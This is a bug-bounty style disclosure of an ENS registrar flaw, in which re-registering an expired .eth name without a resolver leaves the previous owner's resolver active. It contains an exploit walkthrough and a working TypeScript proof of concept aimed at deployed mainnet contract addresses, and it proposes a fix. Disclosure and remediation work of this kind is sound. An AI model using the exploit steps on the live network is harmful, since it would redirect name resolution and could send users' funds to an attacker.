# Expired .eth re-registration without resolver leaves attacker-controlled resolver active
Severity: Medium

Bounty Criteria Match: medium (smart contract): Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

Affected Assets / Contracts:

- ETHRegistrarController `register` at `0x59E16fcCd424Cc24e280Be16E11Bcd56fb0CE547`: https://github.com/ensdomains/ens-contracts/blob/91c966febd7b55494269df830fc6775f040b927b/contracts/ethregistrar/ETHRegistrarController.sol#L247-L319
- BaseRegistrarImplementation `register` / `_register` at `0x57f1887a8BF19b14fC0dF6Fd9B2acc9Af147eA85`: https://github.com/ensdomains/ens-contracts/blob/91c966febd7b55494269df830fc6775f040b927b/contracts/ethregistrar/BaseRegistrarImplementation.sol#L100-L150
- ENS Registry at `0x00000000000C2E074eC69A0dFb2997BA6C7d2e1e`: https://github.com/ensdomains/ens-contracts/blob/91c966febd7b55494269df830fc6775f040b927b/contracts/registry/ENSRegistry.sol#L33-L95

## Executive Summary

An unprivileged prior registrant of an expired `.eth` name can leave a resolver contract they control attached to the ENS registry node. When a later buyer re-registers that same name through the supported no-resolver registration path, the controller transfers the ERC721/name ownership to the buyer but does not clear the old resolver. The buyer owns the registrar NFT and registry node, while applications resolving the name still query the prior registrant's resolver.

This is best framed as Medium smart-contract griefing: the stale resolver lets the prior owner spoof or redirect resolution for the new owner until the new owner notices and replaces or clears the resolver. The new owner can recover control by setting a new resolver, so the report does not rely on permanent NFT alteration or direct theft.

## Vulnerability Details

The expected invariant is that a fresh `.eth` registration establishes the new owner together with the resolver state chosen by that registration. If the buyer supplies `resolver == address(0)`, the resulting registry record should not keep a resolver selected by a previous owner.

The controller violates that invariant by splitting registration into two branches. The zero-resolver branch only calls `base.register`; only the nonzero-resolver branch calls `ens.setRecord`:

```solidity
if (registration.resolver == address(0)) {
    expires = base.register(
        uint256(labelhash),
        registration.owner,
        registration.duration
    );
} else {
    expires = base.register(
        uint256(labelhash),
        address(this),
        registration.duration
    );

    bytes32 namehash = keccak256(abi.encodePacked(ETH_NODE, labelhash));
    ens.setRecord(
        namehash,
        registration.owner,
        registration.resolver,
        0
    );
```

`BaseRegistrarImplementation._register` burns the expired ERC721 token, mints a new token, and updates only the subnode owner in the registry:

```solidity
expiries[id] = block.timestamp + duration;
if (_exists(id)) {
    _burn(id);
}
_mint(owner, id);
if (updateRegistry) {
    ens.setSubnodeOwner(baseNode, bytes32(id), owner);
}
```

The registry confirms why this preserves stale resolver state: `setSubnodeOwner` writes only `owner`, while resolver and TTL are changed only by `setRecord`, `setSubnodeRecord`, `setResolver`, or `_setResolverAndTTL`.

```solidity
function setSubnodeOwner(
    bytes32 node,
    bytes32 label,
    address owner
) public virtual override authorised(node) returns (bytes32) {
    bytes32 subnode = keccak256(abi.encodePacked(node, label));
    _setOwner(subnode, owner);
    emit NewOwner(node, label, owner);
    return subnode;
}

function setResolver(bytes32 node, address resolver)
    public virtual override authorised(node)
{
    emit NewResolver(node, resolver);
    records[node].resolver = resolver;
}
```

As a result, ownership and resolution diverge after re-registration: the registry owner becomes the buyer, but the registry resolver remains the previous owner-controlled contract.

## Attack Preconditions and Threat Model

The attacker is an ordinary unprivileged ENS user. The attack does not require malicious or mistaken trusted/admin roles, leaked keys, compromised credentials, governance action, oracle manipulation, phishing, or social engineering.

Required conditions are practical: the attacker previously registered a `.eth` label, selected a resolver they control, and allowed the name to expire past the registrar grace period. A later buyer then re-registers the same available label using the supported no-resolver path (`resolver == address(0)`). That buyer action is a normal registration option, not a privileged or out-of-scope user mistake.

## Exploit Walkthrough

1. The attacker registers `example.eth` through the deployed ETHRegistrarController and supplies an attacker-owned resolver.
2. The attacker sets resolver records such as `addr(example.eth)` to an attacker-controlled address.
3. The registration expires, the 90-day grace period passes, and the name becomes available for re-registration.
4. A victim registers the same label with `resolver == address(0)`, paying the normal registration price.
5. `BaseRegistrarImplementation.ownerOf(tokenId)` and `ENSRegistry.owner(node)` now return the victim, proving the victim owns the ERC721 and registry node.
6. `ENSRegistry.resolver(node)` still returns the attacker's resolver, so ENS clients continue to use attacker-controlled records for the victim's name.
7. The victim cannot update records inside the attacker-owned resolver, while the attacker can still mutate the live resolution payload, including redirecting the resolved address.

## Impact and Bounty Severity

The affected asset is the deployed ENS smart contract system for `.eth` registrations. The value at risk includes any expired `.eth` name re-registered without a resolver after a prior owner attached an independently controlled resolver. The immediate state damage is a name/NFT whose owner and active resolver payload disagree: the new owner is shown onchain, but the name resolves according to the prior owner's contract until the victim discovers and explicitly replaces or clears the resolver.

This is feasible with normal registration transactions and was proven on a local mainnet fork at block `25030187` using deployed ENS addresses. The demonstrated impact maps to the program's Medium smart contract griefing row: the attacker does not need profit motive, but the stale resolver damages the new owner and ENS users by serving attacker-controlled address, text, contenthash, name, or other resolver records for a name the attacker no longer owns. The new owner can clear or replace the resolver after discovering the issue, which bounds the impact to Medium.

## Proof of Code

Save as: test/ExpiredNameNoResolverReRegistrationPoC.test.ts

Run: `MAINNET_RPC_URL=<mainnet rpc url> bun run test test/ExpiredNameNoResolverReRegistrationPoC.test.ts`

Secret Gist PoC bundle: https://gist.github.com/apmfree78/798d4abf243f35aef745a1de9c17b0e7

Expected result: The test passes after proving the victim owns the re-registered name while the registry resolver remains attacker-controlled, the victim cannot update that resolver, and the attacker can still mutate the resolved address.

```typescript
import hre from 'hardhat'
import { createAnvil } from '@viem/anvil'
import {
  type Address,
  type Hex,
  createPublicClient,
  createWalletClient,
  hexToBigInt,
  http,
  keccak256,
  labelhash,
  namehash,
  parseEther,
  toBytes,
  toHex,
  zeroHash,
} from 'viem'
import { privateKeyToAccount } from 'viem/accounts'
import { mainnet } from 'viem/chains'

// Fixed fork block keeps the PoC reproducible while still using deployed mainnet state.
const MAINNET_FORK_BLOCK = 25030187n
const REGISTRATION_DURATION = 28n * 24n * 60n * 60n
const GRACE_PERIOD = 90n * 24n * 60n * 60n
const PREMIUM_DECAY_PERIOD = 28n * 24n * 60n * 60n
const BASE_REGISTRAR = '0x57f1887a8BF19b14fC0dF6Fd9B2acc9Af147eA85'
const ETH_REGISTRAR_CONTROLLER =
  '0x59E16fcCd424Cc24e280Be16E11Bcd56fb0CE547'
const ENS_REGISTRY = '0x00000000000C2E074eC69A0dFb2997BA6C7d2e1e'

/**
 * Well-known deterministic Hardhat/Anvil dev keys.
 *
 * These are public test keys, funded only inside the local Anvil fork with
 * anvil_setBalance below. They are not secrets and must never be used on
 * mainnet or any funded network.
 */
const attacker = privateKeyToAccount(
  '0x59c6995e998f97a5a0044966f0945389d78589786e8b1a1a0c35a0a1a16cd363',
)
const victim = privateKeyToAccount(
  '0x5de4111acf9a1971b0b2b092737e3a3a2c88c7b0d1b2e5f1e8b7e7b2f60e8f1b',
)
const replacement = privateKeyToAccount(
  '0x7c852118294bbba4a69d92112efb3e1a2b1d5d973250f0e0999d3da9e2cb4565',
)

const controllerAbi = [
  {
    type: 'function',
    name: 'rentPrice',
    stateMutability: 'view',
    inputs: [
      { name: 'label', type: 'string' },
      { name: 'duration', type: 'uint256' },
    ],
    outputs: [
      {
        name: 'price',
        type: 'tuple',
        components: [
          { name: 'base', type: 'uint256' },
          { name: 'premium', type: 'uint256' },
        ],
      },
    ],
  },
  {
    type: 'function',
    name: 'available',
    stateMutability: 'view',
    inputs: [{ name: 'label', type: 'string' }],
    outputs: [{ name: '', type: 'bool' }],
  },
  {
    type: 'function',
    name: 'minCommitmentAge',
    stateMutability: 'view',
    inputs: [],
    outputs: [{ name: '', type: 'uint256' }],
  },
  {
    type: 'function',
    name: 'makeCommitment',
    stateMutability: 'pure',
    inputs: [
      {
        name: 'registration',
        type: 'tuple',
        components: [
          { name: 'label', type: 'string' },
          { name: 'owner', type: 'address' },
          { name: 'duration', type: 'uint256' },
          { name: 'secret', type: 'bytes32' },
          { name: 'resolver', type: 'address' },
          { name: 'data', type: 'bytes[]' },
          { name: 'reverseRecord', type: 'uint8' },
          { name: 'referrer', type: 'bytes32' },
        ],
      },
    ],
    outputs: [{ name: '', type: 'bytes32' }],
  },
  {
    type: 'function',
    name: 'commit',
    stateMutability: 'nonpayable',
    inputs: [{ name: 'commitment', type: 'bytes32' }],
    outputs: [],
  },
  {
    type: 'function',
    name: 'register',
    stateMutability: 'payable',
    inputs: [
      {
        name: 'registration',
        type: 'tuple',
        components: [
          { name: 'label', type: 'string' },
          { name: 'owner', type: 'address' },
          { name: 'duration', type: 'uint256' },
          { name: 'secret', type: 'bytes32' },
          { name: 'resolver', type: 'address' },
          { name: 'data', type: 'bytes[]' },
          { name: 'reverseRecord', type: 'uint8' },
          { name: 'referrer', type: 'bytes32' },
        ],
      },
    ],
    outputs: [],
  },
] as const

const baseRegistrarAbi = [
  {
    type: 'function',
    name: 'ownerOf',
    stateMutability: 'view',
    inputs: [{ name: 'tokenId', type: 'uint256' }],
    outputs: [{ name: '', type: 'address' }],
  },
] as const

const ensRegistryAbi = [
  {
    type: 'function',
    name: 'owner',
    stateMutability: 'view',
    inputs: [{ name: 'node', type: 'bytes32' }],
    outputs: [{ name: '', type: 'address' }],
  },
  {
    type: 'function',
    name: 'resolver',
    stateMutability: 'view',
    inputs: [{ name: 'node', type: 'bytes32' }],
    outputs: [{ name: '', type: 'address' }],
  },
] as const

const resolverAbi = [
  {
    type: 'function',
    name: 'setAddr',
    stateMutability: 'nonpayable',
    inputs: [
      { name: 'node', type: 'bytes32' },
      { name: 'addr', type: 'address' },
    ],
    outputs: [],
  },
  {
    type: 'function',
    name: 'addr',
    stateMutability: 'view',
    inputs: [{ name: 'node', type: 'bytes32' }],
    outputs: [{ name: '', type: 'address' }],
  },
] as const

type Registration = {
  label: string
  owner: Address
  duration: bigint
  secret: Hex
  resolver: Address
  data: Hex[]
  reverseRecord: number
  referrer: Hex
}

const rpcUrl = process.env.MAINNET_RPC_URL
const anvil = createAnvil({
  forkUrl: rpcUrl,
  forkBlockNumber: MAINNET_FORK_BLOCK,
  chainId: 1,
  port: 18546,
  startTimeout: 60_000,
})

const publicClient = createPublicClient({
  chain: mainnet,
  transport: http(`http://${anvil.host}:${anvil.port}`),
})
const attackerWallet = createWalletClient({
  account: attacker,
  chain: mainnet,
  transport: http(`http://${anvil.host}:${anvil.port}`),
})
const victimWallet = createWalletClient({
  account: victim,
  chain: mainnet,
  transport: http(`http://${anvil.host}:${anvil.port}`),
})

async function mineAt(timestamp: bigint) {
  await publicClient.request({
    method: 'evm_setNextBlockTimestamp',
    params: [Number(timestamp)],
  } as never)
  await publicClient.request({ method: 'evm_mine', params: [] } as never)
}

async function wait(hash: Hex) {
  await publicClient.waitForTransactionReceipt({ hash })
}

async function fund(address: Address) {
  // Give local fork actors ETH for gas/registrations without touching mainnet.
  await publicClient.request({
    method: 'anvil_setBalance',
    params: [address, toHex(parseEther('10000'))],
  } as never)
}

// Registers through the deployed mainnet ETHRegistrarController, including
// the real commit/reveal delay and rentPrice calculation.
async function registerName(
  label: string,
  owner: Address,
  resolver: Address,
  secretText: string,
  accountWallet: typeof attackerWallet,
) {
  const registration: Registration = {
    label,
    owner,
    duration: REGISTRATION_DURATION,
    secret: keccak256(toBytes(secretText)),
    resolver,
    data: [],
    reverseRecord: 0,
    referrer: zeroHash,
  }
  const commitment = await publicClient.readContract({
    address: ETH_REGISTRAR_CONTROLLER,
    abi: controllerAbi,
    functionName: 'makeCommitment',
    args: [registration],
  })
  await wait(
    await accountWallet.writeContract({
      address: ETH_REGISTRAR_CONTROLLER,
      abi: controllerAbi,
      functionName: 'commit',
      args: [commitment],
    }),
  )

  const minCommitmentAge = await publicClient.readContract({
    address: ETH_REGISTRAR_CONTROLLER,
    abi: controllerAbi,
    functionName: 'minCommitmentAge',
  })
  const latestBlock = await publicClient.getBlock()
  await mineAt(latestBlock.timestamp + minCommitmentAge + 1n)

  const price = await publicClient.readContract({
    address: ETH_REGISTRAR_CONTROLLER,
    abi: controllerAbi,
    functionName: 'rentPrice',
    args: [label, REGISTRATION_DURATION],
  })
  await wait(
    await accountWallet.writeContract({
      address: ETH_REGISTRAR_CONTROLLER,
      abi: controllerAbi,
      functionName: 'register',
      args: [registration],
      value: price.base + price.premium,
    }),
  )
}

beforeAll(async () => {
  if (!rpcUrl) throw new Error('Set MAINNET_RPC_URL to run this fork PoC')
  // Start an isolated Ethereum mainnet fork. All writes below happen locally.
  await anvil.start()
  await fund(attacker.address)
  await fund(victim.address)
  await fund(replacement.address)
}, 90_000)

afterAll(async () => {
  await anvil.stop()
})

describe('ExpiredNameNoResolverReRegistrationPoC', () => {
  it('uses mainnet ENS contracts to show no-resolver re-registration keeps the old resolver', async () => {
    const label = 'staleresolverpocfork'
    const tokenId = hexToBigInt(labelhash(label))
    const node = namehash(`${label}.eth`)

    // A real user can deploy their own resolver; this is not a protocol mock.
    const resolverArtifact = await hre.artifacts.readArtifact('OwnedResolver')
    const deployHash = await attackerWallet.deployContract({
      abi: resolverArtifact.abi,
      bytecode: resolverArtifact.bytecode as Hex,
    })
    const deployReceipt = await publicClient.waitForTransactionReceipt({
      hash: deployHash,
    })
    const attackerResolver = deployReceipt.contractAddress!

    // The attacker uses a valid self-owned resolver when registering the name.
    await registerName(
      label,
      attacker.address,
      attackerResolver,
      'attacker-registration-secret',
      attackerWallet,
    )
    await wait(
      await attackerWallet.writeContract({
        address: attackerResolver,
        abi: resolverAbi,
        functionName: 'setAddr',
        args: [node, attacker.address],
      }),
    )
    expect(
      (
        await publicClient.readContract({
          address: attackerResolver,
          abi: resolverAbi,
          functionName: 'addr',
          args: [node],
        })
      ).toLowerCase(),
    ).toBe(attacker.address.toLowerCase())

    // Move past expiry, grace period, and premium decay so the same name is
    // normally available for a later buyer to re-register.
    const expiryBlock = await publicClient.getBlock()
    await mineAt(
      expiryBlock.timestamp +
        REGISTRATION_DURATION +
        GRACE_PERIOD +
        PREMIUM_DECAY_PERIOD +
        2n,
    )
    expect(
      await publicClient.readContract({
        address: ETH_REGISTRAR_CONTROLLER,
        abi: controllerAbi,
        functionName: 'available',
        args: [label],
      }),
    ).toBe(true)

    // A later buyer uses the supported no-resolver registration path.
    await registerName(
      label,
      victim.address,
      '0x0000000000000000000000000000000000000000',
      'victim-registration-secret',
      victimWallet,
    )

    expect(
      (
        await publicClient.readContract({
          address: BASE_REGISTRAR,
          abi: baseRegistrarAbi,
          functionName: 'ownerOf',
          args: [tokenId],
        })
      ).toLowerCase(),
    ).toBe(victim.address.toLowerCase())
    expect(
      (
        await publicClient.readContract({
          address: ENS_REGISTRY,
          abi: ensRegistryAbi,
          functionName: 'owner',
          args: [node],
        })
      ).toLowerCase(),
    ).toBe(victim.address.toLowerCase())
    expect(
      (
        await publicClient.readContract({
          address: ENS_REGISTRY,
          abi: ensRegistryAbi,
          functionName: 'resolver',
          args: [node],
        })
      ).toLowerCase(),
    ).toBe(attackerResolver.toLowerCase())

    // The victim owns the name, but the stale resolver is still controlled by
    // the prior owner, so the victim cannot update records through it.
    await expect(
      victimWallet.writeContract({
        address: attackerResolver,
        abi: resolverAbi,
        functionName: 'setAddr',
        args: [node, victim.address],
      }),
    ).rejects.toThrow()

    // The prior owner can still mutate the live resolution payload.
    await wait(
      await attackerWallet.writeContract({
        address: attackerResolver,
        abi: resolverAbi,
        functionName: 'setAddr',
        args: [node, replacement.address],
      }),
    )
    expect(
      (
        await publicClient.readContract({
          address: attackerResolver,
          abi: resolverAbi,
          functionName: 'addr',
          args: [node],
        })
      ).toLowerCase(),
    ).toBe(replacement.address.toLowerCase())
  })
})
```

## Recommended Fix

Make the zero-resolver registration path explicitly clear resolver and TTL state for the freshly registered node. The lowest-risk controller-level fix is to mirror the nonzero-resolver branch: register the name temporarily to the controller, call `ens.setRecord(namehash, registration.owner, address(0), 0)`, then transfer the ERC721 to `registration.owner`. An alternative registrar-level fix is to have fresh registrations call `setSubnodeRecord(baseNode, labelhash, owner, address(0), 0)` when updating the registry, so expired-name registrations never inherit resolver state.

Add a regression test where a prior owner registers with a self-owned resolver, lets the name expire, and a later user re-registers with `resolver == address(0)`. The test should assert that the new owner owns both the ERC721 and registry node, `ENSRegistry.resolver(node) == address(0)`, and the old resolver can no longer affect live name resolution.

## References

- ENS Immunefi bounty information: https://immunefi.com/bug-bounty/ens/information/
- ENS Immunefi scope: https://immunefi.com/bug-bounty/ens/scope/
- ENS Immunefi resources: https://immunefi.com/bug-bounty/ens/resources/
- Immunefi severity system v2.3: https://immunefi.com/immunefi-vulnerability-severity-classification-system-v2-3/
- ENS documentation: https://docs.ens.domains/
- ENS deployments wiki: https://github.com/ensdomains/ens-contracts/wiki/ENS-Contract-Deployments
- ETHRegistrarController source: https://github.com/ensdomains/ens-contracts/blob/91c966febd7b55494269df830fc6775f040b927b/contracts/ethregistrar/ETHRegistrarController.sol#L247-L319
- BaseRegistrarImplementation source: https://github.com/ensdomains/ens-contracts/blob/91c966febd7b55494269df830fc6775f040b927b/contracts/ethregistrar/BaseRegistrarImplementation.sol#L100-L150
- ENSRegistry source: https://github.com/ensdomains/ens-contracts/blob/91c966febd7b55494269df830fc6775f040b927b/contracts/registry/ENSRegistry.sol#L33-L95
- OwnedResolver source used by the local fork PoC: https://github.com/ensdomains/ens-contracts/blob/91c966febd7b55494269df830fc6775f040b927b/contracts/resolvers/OwnedResolver.sol#L14-L30
- PoC runtime assumptions: local mainnet fork only, fork block `25030187`, `MAINNET_RPC_URL` supplied by the runner, no broadcast mode and no live state mutation.
